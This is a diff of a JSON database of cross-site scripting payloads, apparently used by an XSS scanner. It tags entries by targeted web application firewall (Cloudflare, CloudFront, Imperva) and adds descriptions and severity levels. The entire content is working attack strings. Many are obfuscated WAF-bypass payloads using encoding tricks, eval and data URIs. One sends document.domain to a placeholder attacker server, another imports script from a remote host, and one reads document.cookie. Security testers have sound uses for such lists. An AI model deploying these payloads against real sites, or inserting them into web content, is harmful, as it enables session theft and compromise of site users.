@@ -2,1842 +2,1886 @@
   {
     "Payload": "\" onmouseover=alert(1)>",
     "Attribute": [
-      "\""
+      "\"",
+      ")",
+      ">",
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"><script>alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "\""
+      "\"",
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/onload=alert(1)>",
     "Attribute": [
-      "<",
+      "/",
+      ")",
+      "(",
       ">",
-      "/"
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<img src=x onerror=alert(1)>",
     "Attribute": [
+      ")",
       ">",
-      "<"
+      "<",
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<image/src/onerror=prompt(8)>",
     "Attribute": [
+      "/",
+      ")",
+      "(",
       ">",
-      "<",
-      "/"
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<img src=x onerror=alert(1);> ",
     "Attribute": [
-      "<",
-      ">",
+      ")",
       ";",
-      "/"
+      "(",
+      ">",
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
     "Attribute": [
-      "\"",
-      "<",
-      ">",
       "/",
-      "'"
+      "\"",
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"><svg onload=alert(1)//",
     "Attribute": [
+      "/",
       "\"",
+      ")",
+      "(",
       ">",
-      "<",
-      "'"
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<x contenteditable onblur=alert(1)>lose focus! ",
     "Attribute": [
-      "\"",
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<x onclick=alert(1)>click this! ",
     "Attribute": [
-      "\"",
-      "'",
+      ")",
       ">",
       "<",
-      "/"
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<x onmouseover=alert(1)>hover this!",
     "Attribute": [
-      "\"",
-      "'",
+      ")",
       ">",
-      "<"
+      "<",
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"><img src=1 onerror=alert(1)>.gif",
     "Attribute": [
       "\"",
+      ")",
+      "(",
       ">",
-      "<",
-      ";",
-      "/"
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<a\"/onclick=(confirm)()>Click Here!\n",
     "Attribute": [
-      "<",
-      "\"",
       "/",
-      ">"
+      "\"",
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "Dec: <svg onload=prompt%26%230000000040document.domain)>\n",
     "Attribute": [
-      "<",
-      ">"
+      ")",
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "Hex: <svg onload=prompt%26%23x000000028;document.domain)>\n",
     "Attribute": [
-      "<",
+      ">",
+      ")",
       ";",
-      ">"
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n",
     "Attribute": [
-      "'",
+      "/",
       "\"",
+      "{",
+      "'",
+      ";",
       ">",
       "<",
-      ";",
-      "/"
+      "}"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>\n",
     "Attribute": [
-      "<",
+      "/",
       "\"",
+      ")",
       ";",
+      "(",
       ">",
-      "/"
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<--%253cimg%20onerror=alert(1)%20src=a%253e --!>\n",
     "Attribute": [
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>\n",
     "Attribute": [
-      "<",
+      ")",
       "'",
       ";",
-      ">"
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "javascript:{ alert`0` }\n",
-    "Attribute": [],
+    "Attribute": [
+      "}",
+      "{"
+    ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "1'\"><img/src/onerror=.1|alert``>\n",
     "Attribute": [
-      "'",
+      "/",
       "\"",
+      "'",
       ">",
-      "<",
-      "/"
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<img src=x onError=import('//1152848220/')>\n",
     "Attribute": [
-      "<",
-      "'",
       "/",
-      ">"
+      ")",
+      "'",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "%2sscript%2ualert()%2s/script%2u\n",
     "Attribute": [
-      "/"
+      "/",
+      ")",
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg on onload=(alert)(document.domain)>\n",
     "Attribute": [
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<img ignored=() src=x onerror=prompt(1)>\n",
     "Attribute": [
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg onx=() onload=(confirm)(1)>\n",
     "Attribute": [
-      "<",
-      ">"
-    ],
-    "count": 0,
-    "waf": "cloudflare"
-  },
-  {
-    "Payload": "\u00e2\u20ac\u0153><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;\n",
-    "Attribute": [
+      ")",
       ">",
       "<",
-      ";"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
+  },
+  {
+    "Payload": "â€œ><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;\n",
+    "Attribute": [
+      ";",
+      ">",
+      "<"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg on =i onload=alert(domain) (working)\n",
     "Attribute": [
-      "<"
+      ")",
+      "<",
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/onload=location/**/='https://your.server/'+document.domain>\n",
     "Attribute": [
-      "<",
       "/",
       "'",
-      ">"
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg onx=() onload=window.alert?.()> (working)\n",
     "Attribute": [
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "test\",prompt%0A/*HelloWorld*/(document.domain)\n",
     "Attribute": [
       "\"",
-      "/"
+      "/",
+      ")",
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"onx+%00+onpointerenter%3dalert(domain)+x\"\n",
     "Attribute": [
-      "\""
+      "\"",
+      ")",
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"><svg%20onload=alert%26%230000000040\"1\")>\n",
     "Attribute": [
       "\"",
+      ")",
       ">",
       "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "%27%09);%0d%0a%09%09[1].find(alert)//\n",
     "Attribute": [
+      "/",
+      "]",
+      ")",
       ";",
-      "/"
+      "(",
+      "["
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\"><img src=1 onmouseleave=print()>\n",
     "Attribute": [
       "\"",
+      ")",
+      "(",
       ">",
       "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg on onload=(alert)(document.domain)>\n",
     "Attribute": [
+      ")",
+      ">",
       "<",
-      ">"
+      "("
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/on%20onload=alert(1)>\n",
     "Attribute": [
-      "<",
       "/",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<img/src=x onError=\"`${x}`;alert(`Ex.Mi`);\">",
     "Attribute": [
-      "<",
       "/",
       "\"",
+      "{",
+      ")",
       ";",
-      ">"
+      "(",
+      ">",
+      "<",
+      "}"
     ],
+    "waf": "cloudflare",
     "count": 0,
-    "waf": "cloudflare"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\">%0D%0A%0D%0A<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>\n",
     "Attribute": [
+      "/",
       "\"",
-      ">",
-      "<",
       "'",
-      "/"
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudfront",
     "count": 0,
-    "waf": "cloudfront"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\">'><details/open/ontoggle=confirm('XSS')>\n",
     "Attribute": [
+      "/",
       "\"",
-      ">",
       "'",
-      "<",
-      "/"
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudfront",
     "count": 0,
-    "waf": "cloudfront"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/\n",
     "Attribute": [
+      ")",
+      "/",
       "'",
-      "/"
+      "("
     ],
+    "waf": "cloudfront",
     "count": 0,
-    "waf": "cloudfront"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;",
     "Attribute": [
-      ";"
+      ")",
+      ";",
+      "("
     ],
+    "waf": "cloudfront",
     "count": 0,
-    "waf": "cloudfront"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/onload=alert(1)>",
     "Attribute": [
-      "<",
       "/",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/onload=alert(1)>",
     "Attribute": [
-      "<",
       "/",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "cloudfront",
     "count": 0,
-    "waf": "cloudfront"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<x/onclick=globalThis&lsqb;'\\u0070r\\u006f'+'mpt']&lt;)>clickme\n",
     "Attribute": [
-      "<",
       "/",
-      ";",
+      "]",
       "'",
-      ">"
+      ";",
+      ")",
+      ">",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "tarun\"><x/onafterscriptexecute=confirm%26lpar;)//\n",
     "Attribute": [
-      "\"",
-      ">",
-      "<",
       "/",
-      ";"
+      "\"",
+      ")",
+      ";",
+      ">",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />click  \n",
     "Attribute": [
-      "<",
       "/",
+      "]",
       "\"",
+      "{",
       "'",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<",
+      "[",
+      "}"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<details/open/ontoggle=\"self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];\"> \n",
     "Attribute": [
-      "<",
       "/",
+      "]",
       "\"",
       "'",
       ";",
-      ">"
+      ">",
+      "[",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\n",
     "Attribute": [
-      "<",
       "\"",
+      ")",
       ";",
-      ">"
+      "(",
+      ">",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki \n",
     "Attribute": [
-      "<",
       "/",
+      "]",
       ";",
-      ">"
+      ">",
+      "[",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\"> \n",
     "Attribute": [
-      "<",
+      "/",
       "\"",
       ";",
-      "/",
-      ">"
+      ">",
+      "<"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />tap",
     "Attribute": [
-      "<",
       "/",
+      "]",
       "\"",
+      "{",
       "'",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<",
+      "[",
+      "}"
     ],
+    "waf": "imperva",
     "count": 0,
-    "waf": "imperva"
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "\" onload=prompt(1)>",
     "Attribute": [
       "\"",
-      ">"
+      ")",
+      ">",
+      "("
     ],
+    "waf": null,
     "count": 0,
-    "waf": null
+    "description": null,
+    "level": "medium"
   },
   {
     "Payload": "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "(",
       ")",
-      "=",
-      "'"
+      "'",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Base64 encoded XSS payload",
     "level": "critical"
   },
   {
     "Payload": "<img src=1 onerror=Function('r','e','t','u','r','n',' ','e','v','a','l')()('alert(document.domain)')>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
       ")",
       "'",
-      ","
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Function constructor bypass",
     "level": "critical"
   },
   {
     "Payload": "<svg><animate attributeName=href values=javascript:alert(1) />",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "/",
       ")",
-      ":"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG animate XSS",
     "level": "high"
   },
   {
     "Payload": "<iframe srcdoc=\"&lt;svg onload&equals;alert&lpar;1&rpar;&gt;\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
-      ")",
       "\"",
-      "&",
-      ";"
+      ">",
+      ";",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "HTML entity encoded iframe XSS",
     "level": "critical"
   },
   {
     "Payload": "<script>setTimeout`alert\\x28document.domain\\x29`</script>",
     "Attribute": [
-      "<",
+      "/",
       ">",
-      "(",
-      ")",
-      "\\"
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Template literals with hex encoding",
     "level": "critical"
   },
   {
     "Payload": "<svg><script>alert&#40;1&#41;</script>",
     "Attribute": [
-      "<",
+      ";",
+      "/",
       ">",
-      "(",
-      ")",
-      "&",
-      "#"
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG with HTML entities",
     "level": "high"
   },
   {
     "Payload": "<img/src/onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
       ")",
-      ","
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Character code bypass",
     "level": "critical"
   },
   {
     "Payload": "<details open ontoggle=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "HTML5 details element XSS",
     "level": "medium"
   },
   {
     "Payload": "<marquee onstart=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Marquee onstart event",
     "level": "medium"
   },
   {
     "Payload": "<video><source onerror=\"alert(1)\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "\"",
       ")",
-      "\""
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Video source element XSS",
     "level": "medium"
   },
   {
     "Payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
     "Attribute": [
-      "<",
-      ">",
-      ":",
-      "=",
+      "/",
       "\"",
-      ",",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "MathML with data URI",
     "level": "high"
   },
   {
     "Payload": "<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
     "Attribute": [
-      "<",
+      "/",
       ">",
-      "=",
-      ":",
       ";",
-      ","
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Embed with base64 encoded HTML",
     "level": "critical"
   },
   {
     "Payload": "<object data=\"data:text/html,<script>alert(1)</script>\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
+      "/",
       "\"",
-      ":",
-      ",",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Object with data URI",
     "level": "critical"
   },
   {
     "Payload": "<style>@import'data:,*{x:expression(alert(1))}'</style>",
     "Attribute": [
-      "<",
-      ">",
-      "@",
-      "'",
-      ":",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      ",",
-      "*"
+      "'",
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "CSS import with expression",
     "level": "high"
   },
   {
     "Payload": "<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      ":",
-      "(",
       ")",
-      "%",
-      "7",
-      "b",
-      "d"
+      ">",
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "CSS link with URL encoded expression",
     "level": "high"
   },
   {
     "Payload": "<input onfocus=eval(atob(this.id)) id=YWxlcnQoMSk= autofocus>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
       ")",
-      "+"
+      ">",
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Input autofocus with base64 payload in id",
     "level": "critical"
   },
   {
     "Payload": "<iframe src=\"javascript:&period;[1].find(alert)\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "\"",
-      ":",
-      "&",
-      ";",
-      "[",
       "]",
+      "\"",
+      ")",
+      ";",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "JavaScript with HTML entities and array methods",
     "level": "critical"
   },
   {
     "Payload": "<svg onload=alert(String.fromCharCode(88,83,83))>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
       ")",
-      ","
+      ">",
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG with character code string",
     "level": "high"
   },
   {
     "Payload": "<img src=x onerror=this.src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkgLz4='>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
+      "/",
       "'",
-      ":",
       ";",
-      ",",
-      "+"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Image with base64 SVG payload",
     "level": "critical"
   },
   {
     "Payload": "<form><button formaction=javascript:alert(1)>Click",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      ":",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Form button with JavaScript action",
     "level": "medium"
   },
   {
     "Payload": "<select onfocus=alert(1) autofocus>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Select autofocus XSS",
     "level": "medium"
   },
   {
     "Payload": "<textarea onfocus=alert(1) autofocus>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Textarea autofocus XSS",
     "level": "medium"
   },
   {
     "Payload": "<keygen onfocus=alert(1) autofocus>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Keygen autofocus XSS",
     "level": "medium"
   },
   {
     "Payload": "<audio src=x onerror=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Audio element XSS",
     "level": "medium"
   },
   {
     "Payload": "<video src=x onerror=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Video element XSS",
     "level": "medium"
   },
   {
     "Payload": "<track onerror=alert(1) default>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Track element XSS",
     "level": "medium"
   },
   {
     "Payload": "<source onerror=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Source element XSS",
     "level": "medium"
   },
   {
     "Payload": "<canvas id=x onmouseover=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Canvas mouse event XSS",
     "level": "medium"
   },
   {
     "Payload": "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
+      "/",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG foreignObject XSS",
     "level": "high"
   },
   {
     "Payload": "<use href=data:image/svg+xml,<svg%20id='x'%20xmlns='http://www.w3.org/2000/svg'%20onload='alert(1)'></svg>#x>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      ":",
       "/",
-      "+",
-      "%",
+      ")",
       "'",
       "(",
-      ")",
-      "#"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG use element with external reference",
     "level": "critical"
   },
   {
     "Payload": "<script>opener.eval('alert(document.domain)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
       "'",
-      "."
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Opener window eval",
     "level": "critical"
   },
   {
     "Payload": "<script>parent.eval('alert(document.domain)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
       "'",
-      "."
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Parent window eval",
     "level": "critical"
   },
   {
     "Payload": "<script>top.eval('alert(document.domain)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
       "'",
-      "."
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Top window eval",
     "level": "critical"
   },
   {
     "Payload": "<script>[]['filter']['constructor']('alert(1)')()</script>",
     "Attribute": [
-      "<",
-      ">",
-      "[",
+      "/",
       "]",
       "'",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Array filter constructor bypass",
     "level": "critical"
   },
   {
     "Payload": "<script>window['ev'+'al']('alert(1)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "[",
+      "/",
       "]",
       "'",
-      "+",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "String concatenation eval bypass",
     "level": "critical"
   },
   {
     "Payload": "<script>self['\\x65\\x76\\x61\\x6c']('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "[",
+      "/",
       "]",
       "'",
-      "\\",
-      "x",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Hex encoded eval and alert",
     "level": "critical"
   },
   {
     "Payload": "<iframe src=data:text/html;charset=utf-7;base64,+ADw-script+AD4-alert(1)+ADw-/script+AD4->",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      ":",
+      "/",
+      ")",
       ";",
-      ",",
-      "-",
-      "+",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "UTF-7 encoded iframe payload",
     "level": "critical"
   },
   {
     "Payload": "<meta charset=utf-7 />+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
     "Attribute": [
-      "<",
-      ">",
-      "=",
       "/",
-      "+",
-      "-",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Meta UTF-7 charset XSS",
     "level": "critical"
   },
   {
     "Payload": "<script>eval(URL.createObjectURL(new Blob(['alert(1)'])))</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "[",
+      "/",
       "]",
       "'",
-      "."
+      ")",
+      "(",
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Blob URL eval bypass",
     "level": "critical"
   },
   {
     "Payload": "<script>import('data:text/javascript,alert(1)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "'",
-      ":",
-      ","
+      ")",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "ES6 dynamic import with data URI",
     "level": "critical"
   },
   {
     "Payload": "<script>eval`alert\\x281\\x29`</script>",
     "Attribute": [
-      "<",
+      "/",
       ">",
-      "`",
-      "\\",
-      "x"
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Template literal eval with hex",
